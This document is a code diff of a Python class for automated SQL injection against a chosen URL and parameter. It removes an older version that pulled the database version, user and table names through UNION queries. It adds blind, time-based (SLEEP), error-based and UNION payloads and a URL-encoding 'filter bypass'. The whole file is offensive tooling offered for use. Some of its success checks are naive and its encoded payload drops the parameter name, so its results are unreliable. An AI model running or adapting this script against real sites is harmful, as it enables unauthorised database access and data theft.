@@ -1,90 +1,118 @@
 import requests
+import time
 import random
 import string
-import time
+import urllib.parse
 
 class SQLInjectionAdvanced:
     def __init__(self, target_url, vulnerable_param, headers=None):
         self.target_url = target_url
         self.vulnerable_param = vulnerable_param
         self.headers = headers if headers else {'User-Agent': 'Mozilla/5.0'}
-        self.db_info = {}
 
-    def generate_payload(self, length=12):
+    def generate_payload(self, payload):
         """
-        Generate a random string for SQL injection payload.
+        Generate payload for SQL injection.
         """
-        return ''.join(random.choices(string.ascii_letters + string.digits, k=length))
-
-    def error_based_injection(self, payload):
-        """
-        Try error-based SQL injection to extract information from the database.
-        """
-        sql_error_payload = f"{self.vulnerable_param}={payload}'"
-        url = f"{self.target_url}?{sql_error_payload}"
-
-        try:
-            response = requests.get(url, headers=self.headers)
-            if "error" in response.text or "mysql" in response.text.lower():
-                print(f"Error-based SQL injection successful with payload: {payload}")
-                return True
-        except requests.exceptions.RequestException as e:
-            print(f"Error during error-based injection: {e}")
-        return False
+        return f"{self.vulnerable_param}={payload}"
 
     def blind_sql_injection(self, payload):
         """
-        Perform blind SQL injection by checking response time or page content.
+        Perform Blind SQL Injection attack (no error messages).
         """
-        sql_blind_payload = f"{self.vulnerable_param}={payload}'"
-        url = f"{self.target_url}?{sql_blind_payload}"
-
+        url = f"{self.target_url}?{payload}"
+        
         try:
-            start_time = time.time()
             response = requests.get(url, headers=self.headers)
-            end_time = time.time()
-            if (end_time - start_time) > 2:  # Long delay indicates successful injection
-                print(f"Blind SQL injection successful with payload: {payload}")
+            if "success" in response.text:  # Customize based on target's response
+                print(f"Blind SQL Injection successful with payload: {payload}")
                 return True
         except requests.exceptions.RequestException as e:
-            print(f"Error during blind SQL injection: {e}")
+            print(f"Error during Blind SQL Injection: {e}")
         return False
 
-    def extract_db_info(self):
+    def time_based_blind_sql_injection(self, payload):
         """
-        Try extracting database version, user, and tables using SQL injection.
+        Perform Time-based Blind SQL Injection attack.
         """
-        # Extract Database Version
-        payload = "1' UNION SELECT NULL, VERSION(), NULL--"
-        if self.error_based_injection(payload):
-            print("Database version extracted using error-based injection.")
-
-        # Extract Database User
-        payload = "1' UNION SELECT NULL, USER(), NULL--"
-        if self.error_based_injection(payload):
-            print("Database user extracted using error-based injection.")
-
-        # Extract Tables
-        payload = "1' UNION SELECT NULL, GROUP_CONCAT(table_name), NULL FROM information_schema.tables--"
-        if self.error_based_injection(payload):
-            print("Database tables extracted using error-based injection.")
-
-    def automated_attack(self):
-        """
-        Execute SQL Injection attack with both error-based and blind SQL injection techniques.
-        """
-        print(f"Launching SQL Injection attack on {self.target_url} targeting parameter: {self.vulnerable_param}")
+        url = f"{self.target_url}?{payload}"
+        start_time = time.time()
         
-        # Blind SQL Injection attack
-        payload = self.generate_payload()
-        if self.blind_sql_injection(payload):
-            print("Successfully exploited blind SQL injection.")
+        try:
+            response = requests.get(url, headers=self.headers)
+            end_time = time.time()
+            response_time = end_time - start_time
+            if response_time > 5:  # Customize based on expected delay
+                print(f"Time-based Blind SQL Injection successful with payload: {payload}")
+                return True
+        except requests.exceptions.RequestException as e:
+            print(f"Error during Time-based Blind SQL Injection: {e}")
+        return False
 
-        # Error-based SQL Injection attack
-        self.extract_db_info()
+    def error_based_sql_injection(self, payload):
+        """
+        Perform Error-based SQL Injection attack (based on error messages).
+        """
+        url = f"{self.target_url}?{payload}"
+        
+        try:
+            response = requests.get(url, headers=self.headers)
+            if "SQL syntax" in response.text or "error" in response.text:  # Customize based on error
+                print(f"Error-based SQL Injection successful with payload: {payload}")
+                return True
+        except requests.exceptions.RequestException as e:
+            print(f"Error during Error-based SQL Injection: {e}")
+        return False
 
-    def run_attack(self):
+    def union_based_sql_injection(self, payload):
         """
-        Run the attack with a more sophisticated approach.
+        Perform Union-based SQL Injection attack to extract data.
         """
-        self.automated_attack()
+        url = f"{self.target_url}?{payload}"
+        
+        try:
+            response = requests.get(url, headers=self.headers)
+            if "union" in response.text:  # Customize based on target response
+                print(f"Union-based SQL Injection successful with payload: {payload}")
+                return True
+        except requests.exceptions.RequestException as e:
+            print(f"Error during Union-based SQL Injection: {e}")
+        return False
+
+    def bypass_filter(self, payload):
+        """
+        Try bypassing filters by encoding or obfuscating SQL injection payloads.
+        """
+        encoded_payload = urllib.parse.quote(payload)
+        return encoded_payload
+
+    def execute_sql_injection(self):
+        """
+        Execute various SQL injection techniques on the target.
+        """
+        print(f"Initiating SQL Injection attack on {self.target_url}")
+
+        # Test Blind SQL Injection
+        blind_payload = self.generate_payload("' AND 1=1 --")
+        if self.blind_sql_injection(blind_payload):
+            print("Blind SQL Injection successful!")
+
+        # Test Time-based Blind SQL Injection
+        time_based_payload = self.generate_payload("' OR IF(1=1, SLEEP(5), 0) --")
+        if self.time_based_blind_sql_injection(time_based_payload):
+            print("Time-based Blind SQL Injection successful!")
+
+        # Test Error-based SQL Injection
+        error_based_payload = self.generate_payload("' AND 1=1 --")
+        if self.error_based_sql_injection(error_based_payload):
+            print("Error-based SQL Injection successful!")
+
+        # Test Union-based SQL Injection
+        union_based_payload = self.generate_payload("' UNION SELECT NULL, NULL, NULL --")
+        if self.union_based_sql_injection(union_based_payload):
+            print("Union-based SQL Injection successful!")
+
+        # Test Bypass Filter (encoded payload)
+        encoded_payload = self.bypass_filter("' OR 1=1 --")
+        if self.error_based_sql_injection(encoded_payload):
+            print("Bypassed filter successfully with encoded payload!")
